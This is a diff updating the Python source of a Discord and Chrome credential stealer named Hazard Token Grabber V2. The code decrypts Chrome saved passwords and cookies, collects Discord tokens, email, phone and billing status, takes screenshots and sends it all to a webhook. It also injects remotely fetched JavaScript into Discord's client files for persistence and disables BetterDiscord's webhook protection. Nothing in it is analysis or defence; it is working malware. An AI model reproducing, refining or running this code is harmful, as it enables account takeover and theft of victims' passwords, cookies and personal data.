@@ -1,7 +1,15 @@
-import requests, os, string, random, win32crypt, shutil, sqlite3, zipfile, json, base64, psutil, pyautogui
+import requests
+import os 
+import shutil 
+import sqlite3 
+import zipfile 
+import json 
+import base64 
+import psutil 
+import pyautogui
+
+from win32crypt import CryptUnprotectData
 from re import findall
-from datetime import datetime
-from urllib.request import Request, urlopen
 from Crypto.Cipher import AES
 
 class Hazard_Token_Grabber_V2:
@@ -10,19 +18,32 @@ class Hazard_Token_Grabber_V2:
         self.files = ""
         self.appdata = os.getenv("localappdata")
         self.roaming = os.getenv("appdata")
-        self.tempfolder = f"{self.appdata}\\{self.letters(8)}"
+        self.tempfolder = os.getenv("temp")+"\\Hazard_Token_Grabber_V2"
 
-        os.mkdir(os.path.join(self.tempfolder))
+        try:
+            os.mkdir(os.path.join(self.tempfolder))
+        except Exception:
+            pass
 
         self.tokens = []
         self.saved = []
 
-        self.grabPassword()
-        self.grabCookies()
+        if os.path.exists(os.getenv("appdata")+"\\BetterDiscord"):
+            self.bypass_better_discord()
+
+        if not os.path.exists(self.appdata+'\\Google'):
+            self.files += f"**{os.getlogin()}** doesn't have google installed\n"
+        else:
+            self.grabPassword()
+            self.grabCookies()
         self.grabTokens()
         self.screenshot()
         self.SendInfo()
         self.LogOut()
+        try:
+            shutil.rmtree(self.tempfolder)
+        except (PermissionError, FileExistsError):
+            pass
 
     def getheaders(self, token=None, content_type="application/json"):
         headers = {
@@ -33,35 +54,35 @@ class Hazard_Token_Grabber_V2:
             headers.update({"Authorization": token})
         return headers
 
-    def letters(self, stringLength):
-        return ''.join(random.choice(string.ascii_letters) for i in range(stringLength))
-
     def LogOut(self):
         for proc in psutil.process_iter():
             if any(procstr in proc.name() for procstr in\
-            ['discord', 'Discord', 'DISCORD',]):
+            ['Discord', 'DiscordCanary', 'DiscordDevelopment', 'DiscordPTB']):
                 proc.kill()
         for root, dirs, files in os.walk(os.getenv("LOCALAPPDATA")):
             for name in dirs:
-                if (name.__contains__("discord_desktop_core-")):
+                if "discord_desktop_core-" in name:
                     try:
                         directory_list = os.path.join(root, name+"\\discord_desktop_core\\index.js")
                         os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\Hazard"))
-                        f = urlopen("https://raw.githubusercontent.com/Rdimo/Injection/master/Injection-clean")
-                        index_content = f.read()
-                        with open(directory_list, 'wb') as index_file:
-                            index_file.write(index_content)
-                        with open(directory_list, 'r+') as index_file2:
-                            replace_string = index_file2.read().replace("%WEBHOOK_LINK%", self.webhook)
-                        with open(directory_list, 'w'): pass
-                        with open(directory_list, 'r+') as index_file3:
-                            index_file3.write(replace_string)
                     except FileNotFoundError:
                         pass
+                    f = requests.get("https://raw.githubusercontent.com/Rdimo/Injection/master/Injection-clean").text.replace("%WEBHOOK_LINK%", self.webhook)
+                    with open(directory_list, 'w', encoding="utf-8") as index_file:
+                        index_file.write(f)
         for root, dirs, files in os.walk(os.getenv("APPDATA")+"\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc"):
             for name in files:
                 discord_file = os.path.join(root, name)
                 os.startfile(discord_file)
+
+    def bypass_better_discord(self):
+        bd = os.getenv("appdata")+"\\BetterDiscord\\data\\betterdiscord.asar"
+        with open(bd, "rt", encoding="cp437") as f:
+            content = f.read()
+            content2 = content.replace("api/webhooks", "RdimoTheGoat")
+        with open(bd, 'w'): pass
+        with open(bd, "wt", encoding="cp437") as f:
+            f.write(content2)
 
     def get_master_key(self):
         with open(self.appdata+'\\Google\\Chrome\\User Data\\Local State', "r") as f:
@@ -69,7 +90,7 @@ class Hazard_Token_Grabber_V2:
         local_state = json.loads(local_state)
         master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
         master_key = master_key[5:]
-        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
+        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
         return master_key
     
     def decrypt_payload(self, cipher, payload):
@@ -91,7 +112,7 @@ class Hazard_Token_Grabber_V2:
     
     def grabPassword(self):
         master_key = self.get_master_key()
-        f = open (self.tempfolder+"\\Google Passwords.txt", "w+")
+        f = open(self.tempfolder+"\\Google Passwords.txt", "w", encoding="cp437", errors='ignore')
         f.write("Made by Rdimo | https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")
         login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\Login Data'
         try:
@@ -111,16 +132,17 @@ class Hazard_Token_Grabber_V2:
                     f.write(f"Domain: {url}\nUser: {username}\nPass: {decrypted_password}\n\n")
         except:
             pass
+        f.close()
         cursor.close()
         conn.close()
         try:
             os.remove("Loginvault.db")
         except:
-            pass
+            pass  
 
     def grabCookies(self):
         master_key = self.get_master_key()
-        f = open (self.tempfolder+"\\Google Cookies.txt", "w+")
+        f = open(self.tempfolder+"\\Google Cookies.txt", "w", encoding="cp437", errors='ignore')
         f.write("Made by Rdimo | https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")
         login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\cookies'
         try:
@@ -140,6 +162,7 @@ class Hazard_Token_Grabber_V2:
                     f.write(f"Host: {Host}\nUser: {user}\nCookie: {decrypted_cookie}\n\n")
         except:
             pass
+        f.close()
         cursor.close()
         conn.close()
         try:
@@ -148,7 +171,7 @@ class Hazard_Token_Grabber_V2:
             pass
 
     def grabTokens(self):
-        f = open (self.tempfolder+"\\Discord Info.txt", "w+")
+        f = open(self.tempfolder+"\\Discord Info.txt", "w", encoding="cp437", errors='ignore')
         f.write("Made by Rdimo | https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")
         paths = {
             'Discord': self.roaming + r'\\discord\\Local Storage\\leveldb\\',
@@ -230,15 +253,11 @@ class Hazard_Token_Grabber_V2:
                 nitro_data = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=self.getheaders(token)).json()
                 has_nitro = False
                 has_nitro = bool(len(nitro_data) > 0)
-                if has_nitro:
-                    d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
-                    d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
-                    days = abs((d2 - d1).days)
-                days_left = days if has_nitro else "0"
 
-                billing = bool(len(json.loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=self.getheaders(token))))) > 0)
+                billing = bool(len(json.loads(requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=self.getheaders(token)).text)) > 0)
                 
-                f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nHas Billing: {billing.content}\nNitro: {has_nitro}\nNitro Expires in: {days_left} day(s)\nEmail: {email}\nPhone: {phone}\n[Avatar]({url})\n\n")
+                f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n[Avatar]({url})\n\n")
+        f.close()
 
     def screenshot(self):
         image = pyautogui.screenshot()
@@ -277,7 +296,7 @@ class Hazard_Token_Grabber_V2:
                     "color": 16119101,
 
                     "thumbnail": {
-                      "url": "https://cdn.discordapp.com/attachments/828047793619861557/891537598063980544/nedladdning_10.gif"
+                      "url": "https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Hazard.gif"
                     },       
 
                     "footer": {
